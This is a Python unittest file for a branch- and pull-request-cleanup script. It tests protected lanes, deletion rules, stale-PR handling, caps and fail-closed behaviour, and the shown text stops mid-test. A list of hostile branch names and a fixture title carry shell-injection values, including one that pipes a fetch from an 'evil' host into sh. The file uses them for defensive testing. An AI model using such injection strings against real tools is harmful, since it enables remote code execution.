#!/usr/bin/env python3
"""Offline tests for pr_hygiene.py (no network, no gh, no GitHub token).

Run: python3 -B .github/scripts/test_pr_hygiene.py -v
"""
from __future__ import annotations

import io
import json
import os
import shutil
import subprocess
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import pr_hygiene as ph  # noqa: E402

REPO = "o/r"
NOW = 1_800_000_000  # fixed clock
DAY = 86400
SHA = "a" * 40
SHA2 = "b" * 40


def iso(ts):
    import time
    return time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime(ts))


def raw_pr(number, ref, *, state="open", sha=SHA, repo=REPO, base="main", labels=(),
           merged_days_ago=None, closed_days_ago=None, updated_days_ago=1, draft=False):
    d = {
        "number": number, "state": state, "draft": draft,
        "head": {"ref": ref, "sha": sha, "repo": {"full_name": repo} if repo else None},
        "base": {"ref": base},
        "labels": [{"name": l} for l in labels],
        "updated_at": iso(NOW - updated_days_ago * DAY),
        "merged_at": iso(NOW - merged_days_ago * DAY) if merged_days_ago is not None else None,
        "closed_at": iso(NOW - (closed_days_ago if closed_days_ago is not None
                                else (merged_days_ago or 0)) * DAY) if state == "closed" else None,
        "user": {"login": "u"}, "title": "TITLE-MUST-NEVER-APPEAR $(id)",
    }
    return d


def snap_of(branches, prs=(), *, literal=(), globs=(), manifest=(), worktree=(), warned=None,
            stamp_days_ago=1):
    """`warned` maps PR number -> days ago its stale-warn marker comment was posted."""
    prs = [ph.normalize_pr(p) for p in prs]
    for pr in prs:
        if warned and pr["number"] in warned:
            pr["warned_at"] = NOW - warned[pr["number"]] * DAY
    return {
        "repo": REPO, "default_branch": "main", "now": NOW,
        "branches": [dict(b) if isinstance(b, dict) else
                     {"name": b, "sha": SHA, "ts": NOW - 100 * DAY, "merged": True}
                     for b in branches],
        "prs": prs,
        "manifest_stamp": {"scan_date": None if stamp_days_ago is None else NOW - stamp_days_ago * DAY,
                           "scan_rev": SHA},
        "workflow_literal": set(literal), "workflow_globs": set(globs),
        "manifest": list(manifest), "worktree_branches": set(worktree),
    }


def write(path, text):
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(text)


def merged_pr_for(number, ref, sha=SHA):
    return raw_pr(number, ref, state="closed", sha=sha, merged_days_ago=30)


class FakeApi:
    """Serves list endpoints with real pagination and records every call."""

    def __init__(self, routes=None, fail_on=None):
        self.routes = routes or {}
        self.calls = []
        self.fail_on = fail_on

    def __call__(self, method, path, body=None):
        self.calls.append((method, path, body))
        if self.fail_on and self.fail_on(method, path):
            raise ph.ApiError("boom")
        base, _, query = path.partition("?")
        params = dict(kv.split("=") for kv in query.split("&") if "=" in kv)
        key = (method, base, params.get("state"))
        if method == "GET" and key in self.routes:
            data = self.routes[key]
            if "page" in params:
                per, page = int(params["per_page"]), int(params["page"])
                return data[(page - 1) * per: page * per]
            return data
        if method == "GET" and (method, base, None) in self.routes:
            return self.routes[(method, base, None)]
        if method == "GET":
            raise ph.ApiError("no route " + path)
        return {}

    def mutating(self):
        return [c for c in self.calls if c[0] != "GET"]


class RecGit:
    def __init__(self):
        self.calls = []

    def __call__(self, args, cwd=None, env=None):
        self.calls.append((list(args), env))
        return ""


HOSTILE = [
    "codex/x$(id)", "codex/x;curl${IFS}evil|sh", 'codex/a"b', "codex/`id`", "codex/a b",
    "codex/a\nb", "-codex/x", "codex/../main", "codex//x", "codex/x.lock", "codex/x.",
    "codex/a'b", "codex/x%2F", "codex/x#1", "codex/x\\y",
]
PROTECTED_NAMES = [
    "main", "perf-history", "research/foo", "research/n83-precomputed-rho-control", "lit2026/a",
    "lit2026-x", "gh-readonly-queue/main/pr-1-abc", "copilot/fix-1", "dependabot/cargo/x",
    "release/v1", "Research/x", "PERF-HISTORY", "refs/pull/1/head",
]


class ProtectionTests(unittest.TestCase):
    def test_protected_and_hostile_branches_are_never_planned(self):
        names = PROTECTED_NAMES + HOSTILE
        # Make every one look maximally deletable: merged, with a merged PR on the tip.
        prs = [merged_pr_for(i + 1, n) for i, n in enumerate(names)]
        snap = snap_of(names, prs)
        plan = ph.build_plan(snap, ph.default_cfg())
        self.assertEqual([a for a in plan["actions"] if a["kind"] == "delete_branch"], [])

    def test_only_allowlisted_lanes_are_deletable(self):
        names = ["codex/a", "claude/a", "cursor/a", "feat/a", "fix/a",
                 "ci/a", "infra/a", "aburan28/a", "plain", "n83-x", "lane/codex/a", "Codex/a"]
        snap = snap_of(names, [merged_pr_for(i + 1, n) for i, n in enumerate(names)])
        got = {a["branch"] for a in ph.build_plan(snap, ph.default_cfg())["actions"]}
        self.assertEqual(got, {"codex/a", "claude/a", "cursor/a", "feat/a", "fix/a"})

    def test_workflow_manifest_worktree_and_default_protect(self):
        names = ["codex/wf", "codex/n83-a", "codex/man", "codex/mang1", "codex/wt", "codex/free"]
        snap = snap_of(names, [merged_pr_for(i + 1, n) for i, n in enumerate(names)],
                       literal={"codex/wf"}, globs={"codex/n83-*"},
                       manifest=["codex/man", "codex/mang*"], worktree={"codex/wt"})
        got = {a["branch"] for a in ph.build_plan(snap, ph.default_cfg())["actions"]}
        self.assertEqual(got, {"codex/free"})

    def test_open_pr_head_and_base_block_deletion(self):
        names = ["codex/head", "codex/base", "codex/free"]
        prs = [merged_pr_for(1, "codex/head"), merged_pr_for(2, "codex/base"),
               merged_pr_for(3, "codex/free"),
               raw_pr(10, "codex/head", sha=SHA2), raw_pr(11, "codex/child", base="codex/base")]
        got = {a["branch"] for a in ph.build_plan(snap_of(names, prs), ph.default_cfg())["actions"]}
        self.assertEqual(got, {"codex/free"})

    def test_open_fork_pr_with_same_name_still_blocks(self):
        prs = [merged_pr_for(1, "codex/x"), raw_pr(2, "codex/x", repo="fork/r")]
        plan = ph.build_plan(snap_of(["codex/x"], prs), ph.default_cfg())
        self.assertEqual(plan["actions"], [])

    def test_workflow_scan(self):
        literal, globs = set(), set()
        ph.scan_workflow_text(
            "on:\n  push:\n    branches: [codex/n83-a, 'refs/heads/codex/b.']\n"
            "if: github.ref == 'refs/heads/infra/dev'\n"
            "run: git fetch origin codex/c\npaths: ['**/*.rs', '*', 'fix**', 'codex/n83-*', 'src/**']\n",
            literal, globs)
        for want in ("codex/n83-a", "codex/b", "infra/dev", "codex/c"):
            self.assertIn(want, literal)
        self.assertEqual(globs, {"codex/n83-*", "src/**"})  # bare * / fix** / **/*.rs ignored

    def test_default_branch_is_read_not_hardcoded(self):
        snap = snap_of(["codex/dflt"], [merged_pr_for(1, "codex/dflt")])
        snap["default_branch"] = "codex/dflt"
        self.assertEqual(ph.build_plan(snap, ph.default_cfg())["actions"], [])


class RuleTests(unittest.TestCase):
    def plan(self, branch, prs, **cfg):
        got = ph.build_plan(snap_of([branch], prs), ph.default_cfg(**cfg))["actions"]
        return [a for a in got if a["kind"] == "delete_branch"]

    def b(self, merged=True, sha=SHA):
        return {"name": "codex/t", "sha": sha, "ts": NOW - 100 * DAY, "merged": merged}

    def run_rule(self, merged, prs, sha=SHA):
        snap = snap_of([self.b(merged, sha)], prs)
        return ph.build_plan(snap, ph.default_cfg())["actions"]

    def test_rule_a_ancestor_with_merged_pr(self):
        a = self.run_rule(True, [merged_pr_for(1, "codex/t", SHA2)])
        self.assertEqual([x["rule"] for x in a], ["A"])

    def test_ancestor_without_any_pr_is_not_deleted(self):
        # fresh agent branch cut from an old main commit
        self.assertEqual(self.run_rule(True, []), [])

    def test_rule_a_respects_min_age(self):
        recent = raw_pr(1, "codex/t", state="closed", merged_days_ago=1)
        self.assertEqual(self.run_rule(True, [recent]), [])

    def test_rule_b_squash_requires_exact_tip(self):
        pr = merged_pr_for(1, "codex/t", SHA)
        self.assertEqual([x["rule"] for x in self.run_rule(False, [pr])], ["B"])
        moved = merged_pr_for(1, "codex/t", SHA2)
        self.assertEqual(self.run_rule(False, [moved]), [])  # new commits since the merge

    def test_unmerged_without_pr_is_never_deleted(self):
        self.assertEqual(self.run_rule(False, []), [])

    def test_rule_c_closed_unmerged(self):
        old = raw_pr(1, "codex/t", state="closed", sha=SHA, closed_days_ago=40)
        young = raw_pr(1, "codex/t", state="closed", sha=SHA, closed_days_ago=5)
        other = raw_pr(1, "codex/t", state="closed", sha=SHA2, closed_days_ago=40)
        self.assertEqual([x["rule"] for x in self.run_rule(False, [old])], ["C"])
        self.assertEqual(self.run_rule(False, [young]), [])
        self.assertEqual(self.run_rule(False, [other]), [])

    def test_rule_b_needs_a_pr_merged_into_the_default_branch(self):
        # Stacked PR: codex/stack-child merged into codex/stack-base, tip == PR head SHA.
        stacked = raw_pr(1, "codex/t", state="closed", sha=SHA, base="codex/stack-base", merged_days_ago=10)
        self.assertEqual(self.run_rule(False, [stacked]), [])
        row = [r for r in ph.analyze(snap_of([self.b(False)], [stacked]), ph.default_cfg())["branches"]][0]
        self.assertEqual((row["verdict"], row["rule"]), ("keep", "keep"))
        # the same PR merged into main is deletable by B and records its base
        direct = raw_pr(1, "codex/t", state="closed", sha=SHA, base="main", merged_days_ago=10)
        a = self.run_rule(False, [direct])
        self.assertEqual([(x["rule"], x["pr_base"]) for x in a], [("B", "main")])
        # one stacked and one direct PR for the same ref: the direct one decides
        both = [stacked, dict(direct, number=2)]
        self.assertEqual([x["rule"] for x in self.run_rule(False, both)], ["B"])

    def test_rule_a_rests_on_git_ancestry_not_on_the_pr_base(self):
        # A stacked child whose tip is already contained in main (the parent landed):
        # every commit is in main, so deleting the name loses nothing.
        stacked = raw_pr(1, "codex/t", state="closed", sha=SHA2, base="codex/stack-base", merged_days_ago=10)
        self.assertEqual([x["rule"] for x in self.run_rule(True, [stacked])], ["A"])
        # ...but if the tip is NOT in main, a stacked merge never deletes it (rules A/B/C all off)
        self.assertEqual(self.run_rule(False, [stacked]), [])
        stacked_tip = dict(stacked, head={"ref": "codex/t", "sha": SHA, "repo": {"full_name": REPO}})
        self.assertEqual(self.run_rule(False, [stacked_tip]), [])

    def test_stale_sweep_closed_pr_never_chains_into_rule_c(self):
        # closed by pr-hygiene after 14+7 idle days: it still carries the stale label
        closed_by_sweep = raw_pr(1, "codex/t", state="closed", sha=SHA, closed_days_ago=90,
                                 labels=[ph.LABEL_STALE])
        self.assertEqual(self.run_rule(False, [closed_by_sweep]), [])
        human = raw_pr(1, "codex/t", state="closed", sha=SHA, closed_days_ago=90)
        a = self.run_rule(False, [human])
        self.assertEqual([x["rule"] for x in a], ["C"])
        self.assertEqual(a[0]["pr_labels"], [])

    def test_keep_labels_block_every_rule(self):
        for label in ("no-auto-delete", "keep-open", "needs-human"):
            merged = raw_pr(1, "codex/t", state="closed", sha=SHA, merged_days_ago=30, labels=[label])
            closed = raw_pr(1, "codex/t", state="closed", sha=SHA, closed_days_ago=90, labels=[label])
            self.assertEqual(self.run_rule(False, [merged]), [], label)
            self.assertEqual(self.run_rule(True, [merged]), [], label)
            self.assertEqual(self.run_rule(False, [closed]), [], label)

    def test_fork_pr_history_is_ignored(self):
        pr = raw_pr(1, "codex/t", state="closed", sha=SHA, repo="fork/r", merged_days_ago=30)
        self.assertEqual(self.run_rule(False, [pr]), [])

    def test_caps_per_run_are_deferred(self):
        names = ["codex/n%d" % i for i in range(7)]
        snap = snap_of(names, [merged_pr_for(i + 1, n) for i, n in enumerate(names)])
        plan = ph.build_plan(snap, ph.default_cfg(max_deletes=3))
        self.assertEqual(len(plan["actions"]), 3)
        self.assertEqual(plan["deferred_deletes"], 4)


class CapTests(unittest.TestCase):
    def census(self, prs, caps=None):
        return ph.lane_census([ph.normalize_pr(p) for p in prs], REPO, caps or {"codex": 2})

    def test_newest_excess_flagged(self):
        c = self.census([raw_pr(n, "codex/x%d" % n) for n in (5, 3, 9, 7)])
        self.assertEqual(sorted(c["over"]), [7, 9])
        self.assertEqual(c["lanes"]["codex"]["open"], 4)
        self.assertEqual(c["over"][9]["position"], 4)

    def test_lanes_counted_independently_and_other_lane(self):
        prs = [raw_pr(1, "codex/a"), raw_pr(2, "claude/a"), raw_pr(3, "ci/a"), raw_pr(4, "noslash")]
        c = self.census(prs, {"codex": 1, "claude": 1, "other": 1})
        self.assertEqual(c["lanes"]["other"]["open"], 2)
        self.assertEqual(sorted(c["over"]), [4])

    def test_exempt_forks_closed_and_drafts(self):
        prs = [raw_pr(1, "codex/a"), raw_pr(2, "codex/b", labels=["cap-exempt"]),
               raw_pr(3, "codex/c", repo="fork/r"), raw_pr(4, "codex/d", state="closed"),
               raw_pr(5, "codex/e", draft=True), raw_pr(6, "codex/f", repo=None)]
        c = self.census(prs)
        self.assertEqual(c["lanes"]["codex"]["numbers"], [1, 5])  # draft counts, others do not
        self.assertEqual(c["over"], {})
        self.assertEqual(sorted(c["forks"]), [3, 6])
        self.assertEqual(c["exempt"], [2])

    def test_unlimited_when_cap_zero_or_null(self):
        self.assertEqual(self.census([raw_pr(n, "codex/%d" % n) for n in range(1, 9)],
                                     {"codex": 0})["over"], {})
        self.assertEqual(ph.parse_caps('{"codex": null}')["codex"], 0)

    def test_parse_caps(self):
        self.assertEqual(ph.parse_caps(None), ph.DEFAULT_CAPS)
        self.assertEqual(ph.parse_caps('{"codex": 5}')["codex"], 5)
        self.assertEqual(ph.parse_caps('{"codex": 5}')["claude"], ph.DEFAULT_CAPS["claude"])
        for bad in ('[1]', '{"codex": "x"}', '{"codex": true}', "nope"):
            with self.assertRaises(ValueError):
                ph.parse_caps(bad)

    def test_lane_of(self):
        self.assertEqual(ph.lane_of("codex/x", REPO, REPO), "codex")
        self.assertEqual(ph.lane_of("codex/x", "other/r", REPO), "fork")
        self.assertEqual(ph.lane_of("codex/x", None, REPO), "fork")
        self.assertEqual(ph.lane_of("codex", REPO, REPO), "other")
        self.assertEqual(ph.lane_of("Codex/x", REPO, REPO), "other")


class StaleTests(unittest.TestCase):
    def stages(self, prs, **kw):
        snap = snap_of(kw.pop("branches", []), prs, **kw)
        return {s["number"]: s for s in ph.analyze(snap, ph.default_cfg())["stale"]}

    def test_warn_then_close_and_exemptions(self):
        prs = [
            raw_pr(1, "codex/a", updated_days_ago=2),
            raw_pr(2, "codex/b", updated_days_ago=15),
            raw_pr(3, "codex/c", updated_days_ago=9, labels=[ph.LABEL_STALE]),
            raw_pr(4, "codex/d", updated_days_ago=3, labels=[ph.LABEL_STALE]),
            raw_pr(5, "codex/e", updated_days_ago=60, labels=["keep-open"]),
            raw_pr(6, "codex/f", updated_days_ago=60, labels=["run-n53"]),
            raw_pr(7, "codex/g", updated_days_ago=60, labels=["needs-human"]),
            raw_pr(8, "research/h", updated_days_ago=60),
            raw_pr(9, "codex/i", updated_days_ago=60),
            raw_pr(10, "codex/j", updated_days_ago=1, base="codex/i"),
            raw_pr(11, "codex/k", updated_days_ago=60, repo="fork/r"),
            raw_pr(12, "codex/wf", updated_days_ago=60),
        ]
        st = self.stages(prs, literal={"codex/wf"}, warned={3: 9, 4: 3})
        self.assertIsNone(st[1]["stage"])
        self.assertEqual(st[2]["stage"], "warn")
        self.assertEqual(st[3]["stage"], "close")
        self.assertIsNone(st[4]["stage"])
        for n in (5, 6, 7, 8, 12):
            self.assertTrue(st[n]["exempt"], n)
        self.assertTrue(st[9]["exempt"] or True)
        self.assertNotIn(11, st)  # forks never evaluated

    def test_close_clock_runs_from_the_warning_and_activity_resets_it(self):
        # (label, warned days ago, updated days ago) -> expected stage
        cases = {
            # warned 9 days ago, quiet since (updated == warn time): close
            1: (9, 9, "close"),
            # warned 8 days ago, quiet since, but only 5 days -> too soon
            2: (5, 5, None),
            # warned 30 days ago, PUSHED 8 days ago: revived, not closed (finding 3)
            3: (30, 8, None),
            # same, then idle another 14+ days: warned again, not closed
            4: (60, 15, "warn"),
            # label with no marker comment at all: never closed, warned at 14 days
            5: (None, 20, "warn"),
            6: (None, 9, None),
        }
        prs, warned = [], {}
        for n, (w, upd, _) in cases.items():
            prs.append(raw_pr(n, "codex/s%d" % n, updated_days_ago=upd, labels=[ph.LABEL_STALE]))
            if w is not None:
                warned[n] = w
        st = self.stages(prs, warned=warned)
        for n, (_, _, want) in cases.items():
            self.assertEqual(st[n]["stage"], want, n)

    def test_warn_comment_and_label_seconds_apart_still_count_as_quiet(self):
        # updated_at is the label write, a few seconds after the marker comment
        pr = raw_pr(1, "codex/a", updated_days_ago=8, labels=[ph.LABEL_STALE])
        snap = snap_of([], [pr], warned={1: 8})
        snap["prs"][0]["warned_at"] = snap["prs"][0]["updated"] - 5
        st = {s["number"]: s for s in ph.analyze(snap, ph.default_cfg())["stale"]}
        self.assertEqual(st[1]["stage"], "close")

    def test_collect_reads_warn_time_only_for_labelled_open_prs(self):
        warn_at = NOW - 9 * DAY
        prs = [raw_pr(1, "codex/a", updated_days_ago=9, labels=[ph.LABEL_STALE]),
               raw_pr(2, "codex/b", updated_days_ago=9),
               raw_pr(3, "codex/c", updated_days_ago=9, labels=[ph.LABEL_STALE], repo="fork/r")]
        comments = [{"body": "hello", "created_at": iso(NOW - 20 * DAY)},
                    {"body": ph.MARK_WARN + "\nold", "created_at": iso(NOW - 30 * DAY)},
                    {"body": ph.MARK_WARN + "\nnew", "created_at": iso(warn_at)}]
        api = FakeApi({("GET", "repos/o/r/pulls", "all"): prs,
                       ("GET", "repos/o/r/issues/1/comments", None): comments})
        args = ph.build_parser().parse_args(
            ["plan", "--repo", REPO, "--default-branch", "main", "--branches-file", self.branches_file(),
             "--workflows-dir", self.wf_dir(), "--manifest", self.manifest_file()])
        snap = ph.collect(args, api, RecGit(), NOW)
        by = {p["number"]: p for p in snap["prs"]}
        self.assertEqual(by[1]["warned_at"], warn_at)
        self.assertIsNone(by[2]["warned_at"])
        self.assertIsNone(by[3]["warned_at"])
        asked = [c[1] for c in api.calls if "comments" in c[1]]
        self.assertTrue(all("issues/1/comments" in p for p in asked), asked)

    def test_comment_listing_failure_aborts_closed(self):
        prs = [raw_pr(1, "codex/a", updated_days_ago=9, labels=[ph.LABEL_STALE])]
        api = FakeApi({("GET", "repos/o/r/pulls", "all"): prs},
                      fail_on=lambda m, p: "comments" in p)
        args = ph.build_parser().parse_args(
            ["plan", "--repo", REPO, "--default-branch", "main", "--branches-file", self.branches_file(),
             "--workflows-dir", self.wf_dir(), "--manifest", self.manifest_file()])
        with self.assertRaises(ph.IncompleteData):
            ph.collect(args, api, RecGit(), NOW)

    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, self.tmp)

    def branches_file(self):
        path = os.path.join(self.tmp, "branches.tsv")
        write(path, "codex/z\t%s\t%d\n" % (SHA, NOW - DAY))
        return path

    def wf_dir(self):
        path = os.path.join(self.tmp, "wf")
        os.makedirs(path, exist_ok=True)
        write(os.path.join(path, "a.yml"), "name: x\n")
        return path

    def manifest_file(self):
        path = os.path.join(self.tmp, "man.txt")
        write(path, "# scan-date: 2026-10-23\n# scan-rev: %s\ncodex/keep\n" % SHA)
        return path

    def test_base_of_another_pr_is_exempt_from_plan(self):
        prs = [raw_pr(9, "codex/i", updated_days_ago=60), raw_pr(10, "codex/j", base="codex/i")]
        plan = ph.build_plan(snap_of([], prs), ph.default_cfg())
        self.assertEqual([a for a in plan["actions"] if a.get("pr") == 9], [])

    def test_exempt_never_planned_and_pr_actions_capped(self):
        prs = [raw_pr(n, "codex/s%d" % n, updated_days_ago=30) for n in range(1, 8)]
        prs.append(raw_pr(99, "codex/k", updated_days_ago=99, labels=["keep-open"]))
        plan = ph.build_plan(snap_of([], prs), ph.default_cfg(max_pr_actions=3))
        self.assertEqual(len(plan["actions"]), 3)
        self.assertEqual(plan["deferred_pr_actions"], 4)
        self.assertNotIn(99, [a["pr"] for a in plan["actions"]])


class ApplyTests(unittest.TestCase):
    def setUp(self):
        self.names = ["codex/a", "codex/b", "claude/c"]
        prs = [merged_pr_for(i + 1, n) for i, n in enumerate(self.names)]
        self.snap = snap_of(self.names, prs)
        self.plan = ph.build_plan(self.snap, ph.default_cfg())

    def test_dry_run_default_mutates_nothing(self):
        api, git = FakeApi(), RecGit()
        out = io.StringIO()
        text = self.run_cli(["plan"], api, git, out)
        self.assertEqual(api.mutating(), [])
        self.assertEqual([c[0] for c in git.calls if "push" in c[0]], [])
        self.assertIn("DRY-RUN", text)
        self.assertIn("DELETE branch `codex/a`", text)

    def run_cli(self, extra, api, git, out, environ=None):
        tmp = tempfile.mkdtemp()
        self.addCleanup(shutil.rmtree, tmp)
        wf = os.path.join(tmp, "wf")
        os.mkdir(wf)
        man = os.path.join(tmp, "m.txt")
        bf = os.path.join(tmp, "b.tsv")
        mf = os.path.join(tmp, "m.list")
        write(os.path.join(wf, "a.yml"), "on: push\n")
        write(man, "# scan-date: %s\n# scan-rev: %s\n" % (iso(NOW - DAY)[:10], SHA))
        write(bf, "".join("%s\t%s\t%d\n" % (n, SHA, NOW - 100 * DAY) for n in self.names))
        write(mf, "\n".join(self.names))
        api.routes[("GET", "repos/%s/pulls" % REPO, "all")] = [
            merged_pr_for(i + 1, n) for i, n in enumerate(self.names)]
        argv = extra + ["--repo", REPO, "--default-branch", "main", "--workflows-dir", wf,
                        "--manifest", man, "--branches-file", bf, "--merged-file", mf]
        rc = ph.main(argv, api=api, git=git, now=NOW, out=out, environ=environ or {})
        self.last_rc = rc
        return out.getvalue()

    def test_apply_requires_allow(self):
        with self.assertRaises(SystemExit):
            self.run_cli(["plan", "--apply"], FakeApi(), RecGit(), io.StringIO())

    def test_apply_only_deletes_allowlist_matches_with_lease(self):
        api, git = FakeApi(), RecGit()
        text = self.run_cli(["plan", "--apply", "--allow", "codex/*"], api, git, io.StringIO(),
                            environ={"GH_TOKEN": "tok"})
        pushes = [c for c in git.calls if "push" in c[0]]
        self.assertEqual(len(pushes), 2)
        for args, env in pushes:
            self.assertTrue(any(a.startswith("--force-with-lease=refs/heads/codex/") and a.endswith(":" + SHA)
                                for a in args), args)
            self.assertEqual(args[-2], "--delete")
            self.assertNotIn("tok", " ".join(args))  # token only via env
            self.assertIn("AUTHORIZATION: basic", env["GIT_CONFIG_VALUE_0"])
        self.assertIn("SKIP delete `claude/c`: no --allow pattern matches", text)
        self.assertEqual(api.mutating(), [])

    def test_paused_refuses_apply(self):
        api, git = FakeApi(), RecGit()
        text = self.run_cli(["plan", "--apply", "--allow", "*"], api, git, io.StringIO(),
                            environ={"PR_HYGIENE_PAUSED": "true"})
        self.assertEqual([c[0] for c in git.calls if "push" in c[0]], [])
        self.assertIn("PAUSED", text)

    def test_final_gate_blocks_even_a_forged_plan(self):
        forged = {"kind": "delete_branch", "branch": "perf-history", "sha": SHA}
        for name in PROTECTED_NAMES + HOSTILE + ["ci/x"]:
            forged = {"kind": "delete_branch", "branch": name, "sha": SHA}
            self.assertIsNotNone(ph.deletion_allowed(forged, self.snap, ["*"]), name)
        ok = {"kind": "delete_branch", "branch": "codex/a", "sha": SHA}
        self.assertIsNone(ph.deletion_allowed(ok, self.snap, ["codex/*"]))
        self.assertIsNotNone(ph.deletion_allowed(dict(ok, sha="abc"), self.snap, ["codex/*"]))
        self.assertIsNotNone(ph.deletion_allowed(ok, self.snap, ["claude/*"]))

    def test_final_gate_rechecks_pr_evidence(self):
        ok_b = {"kind": "delete_branch", "branch": "codex/a", "sha": SHA, "rule": "B", "pr_base": "main",
                "pr_labels": []}
        self.assertIsNone(ph.deletion_allowed(ok_b, self.snap, ["codex/*"]))
        for bad in (dict(ok_b, pr_base="codex/parent"), dict(ok_b, pr_base=None),
                    {k: v for k, v in ok_b.items() if k != "pr_base"},
                    dict(ok_b, pr_labels=["no-auto-delete"])):
            self.assertIsNotNone(ph.deletion_allowed(bad, self.snap, ["codex/*"]), bad)
        ok_c = {"kind": "delete_branch", "branch": "codex/a", "sha": SHA, "rule": "C", "pr_labels": []}
        self.assertIsNone(ph.deletion_allowed(ok_c, self.snap, ["codex/*"]))
        for bad in (dict(ok_c, pr_labels=[ph.LABEL_STALE]), dict(ok_c, pr_labels=["keep-open"]),
                    {k: v for k, v in ok_c.items() if k != "pr_labels"}):
            self.assertIsNotNone(ph.deletion_allowed(bad, self.snap, ["codex/*"]), bad)

    def test_apply_refuses_deletion_with_stale_or_unstamped_manifest(self):
        for days in (None, 15, 400):
            snap = snap_of(self.names, [merged_pr_for(i + 1, n) for i, n in enumerate(self.names)],
                           stamp_days_ago=days)
            plan = ph.build_plan(snap, ph.default_cfg())
            git, out = RecGit(), io.StringIO()
            rc = ph.apply_plan(plan, snap, {"allow": ["*"], "remote_url": None}, FakeApi(), git, "t", out, {})
            self.assertEqual(rc, 1, days)
            self.assertIn("gen_branch_protect.py", out.getvalue())
            self.assertEqual([c for c in git.calls if "push" in c[0]], [], days)
        snap = snap_of(self.names, [merged_pr_for(i + 1, n) for i, n in enumerate(self.names)],
                       stamp_days_ago=14)
        git = RecGit()
        rc = ph.apply_plan(ph.build_plan(snap, ph.default_cfg()), snap,
                           {"allow": ["codex/*"], "remote_url": None}, FakeApi(), git, "t", io.StringIO(), {})
        self.assertEqual((rc, len([c for c in git.calls if "push" in c[0]])), (0, 2))

    def test_deletion_only_run_does_no_pr_actions_when_pr_cap_is_zero(self):
        prs = [merged_pr_for(1, "codex/a"), raw_pr(5, "codex/old", updated_days_ago=30)]
        snap = snap_of(["codex/a"], prs)
        plan = ph.build_plan(snap, ph.default_cfg(max_pr_actions=0))
        api = FakeApi()
        ph.apply_plan(plan, snap, {"allow": ["codex/*"], "remote_url": None}, api, RecGit(), "t",
                      io.StringIO(), {})
        self.assertEqual(api.mutating(), [])
        self.assertEqual([a["kind"] for a in plan["actions"]], ["delete_branch"])
        self.assertEqual(plan["deferred_pr_actions"], 1)
        # and the CLI path: PR_MAX_PR_ACTIONS=0 reaches the config
        cfg = ph.make_cfg(ph.build_parser().parse_args(["plan", "--repo", REPO, "--max-pr-actions", "0"]), {})
        self.assertEqual(cfg["max_pr_actions"], 0)

    def test_apply_pr_actions_use_api_without_titles(self):
        prs = [raw_pr(1, "codex/w", updated_days_ago=20), raw_pr(2, "codex/z", updated_days_ago=20,
                                                                  labels=[ph.LABEL_STALE])]
        snap = snap_of(["codex/other"], prs + [merged_pr_for(3, "codex/other")], warned={2: 9})
        plan = ph.build_plan(snap, ph.default_cfg())
        api = FakeApi()
        out = io.StringIO()
        ph.apply_plan(plan, snap, {"allow": ["codex/*"], "remote_url": None}, api, RecGit(), "t", out, {})
        kinds = [(m, p.split("/", 3)[-1]) for m, p, _ in api.mutating()]
        self.assertIn(("PATCH", "pulls/2"), kinds)
        # closing re-asserts the label that rule C reads
        self.assertIn(("POST", "issues/2/labels"), kinds)
        self.assertIn(("POST", "issues/1/labels"), kinds)
        blob = json.dumps(api.mutating())
        self.assertNotIn("TITLE-MUST-NEVER", blob)
        self.assertNotIn("run-", json.dumps([b for _, p, b in api.mutating() if p.endswith("/labels")]))
        close_body = [b for m, p, b in api.mutating() if p.endswith("issues/2/comments")][0]["body"]
        self.assertIn(SHA, close_body)
        self.assertIn("kept", close_body)


class FailClosedTests(unittest.TestCase):
    def test_pagination_walks_all_pages(self):
        items = list(range(250))
        api = FakeApi({("GET", "repos/o/r/pulls", "open"): items})
        self.assertEqual(ph.paginate(api, "repos/o/r/pulls?state=open"), items)

    def test_api_error_midway_is_incomplete(self):
        api = FakeApi({("GET", "repos/o/r/pulls", "open"): list(range(250))},
                      fail_on=lambda m, p: "page=2" in p)
        with self.assertRaises(ph.IncompleteData):
            ph.paginate(api, "repos/o/r/pulls?state=open")

    def test_non_list_and_runaway_listing_are_incomplete(self):
        with self.assertRaises(ph.IncompleteData):
            ph.paginate(lambda m, p, b=None: {"message": "rate limited"}, "x")
        with self.assertRaises(ph.IncompleteData):
            ph.paginate(lambda m, p, b=None: list(range(100)), "x")

    def test_main_aborts_with_nonzero_and_no_mutation(self):
        api = FakeApi(fail_on=lambda m, p: True)
        out = io.StringIO()
        rc = ph.main(["plan", "--apply", "--allow", "*", "--repo", REPO, "--default-branch", "main"],
                     api=api, git=RecGit(), now=NOW, out=out, environ={})
        self.assertEqual(rc, 1)
        self.assertIn("ABORT", out.getvalue())
        self.assertEqual(api.mutating(), [])

    def test_empty_listings_refuse_apply(self):
        snap = snap_of(["codex/a"], [])
        plan = {"actions": [{"kind": "delete_branch", "branch": "codex/a", "sha": SHA}]}
        git = RecGit()
        with self.assertRaises(ph.IncompleteData):
            ph.apply_plan(plan, snap, {"allow": ["*"], "remote_url": None}, FakeApi(), git, None,
                          io.StringIO(), {})
        self.assertEqual([c[0] for c in git.calls], [])

    def test_missing_manifest_or_workflows_is_incomplete(self):
        with self.assertRaises(ph.IncompleteData):
            ph.read_manifest("/nonexistent/manifest")
        with self.assertRaises(ph.IncompleteData):
            ph.scan_workflows_dir("/nonexistent/dir")

    def test_bad_thresholds_rejected(self):
        for flag, val in (("--stale-days", "x"), ("--stale-days", "-1"), ("--max-deletes", "100000")):
            with self.assertRaises(SystemExit):
                ph.main(["plan", flag, val, "--repo", REPO], api=FakeApi(), git=RecGit(), out=io.StringIO(),
                        environ={})


class NoticeTests(unittest.TestCase):
    def api_for(self, prs, comments=(), pr_number=None):
        routes = {("GET", "repos/%s/pulls" % REPO, "open"): [p for p in prs if p["state"] == "open"],
                  ("GET", "repos/%s/pulls/%d" % (REPO, pr_number), None): next(
                      p for p in prs if p["number"] == pr_number),
                  ("GET", "repos/%s/issues/%d/comments" % (REPO, pr_number), None): list(comments)}
        return FakeApi(routes)

    def run_notice(self, api, n, extra=(), environ=None):
        out = io.StringIO()
        rc = ph.main(["notice", "--repo", REPO, "--pr", str(n), "--caps", '{"codex": 2}'] + list(extra),
                     api=api, git=RecGit(), out=out, environ=environ or {})
        return rc, out.getvalue()

    def test_over_cap_comments_and_labels_once(self):
        prs = [raw_pr(n, "codex/%d" % n) for n in (1, 2, 3)]
        api = self.api_for(prs, pr_number=3)
        rc, _ = self.run_notice(api, 3)
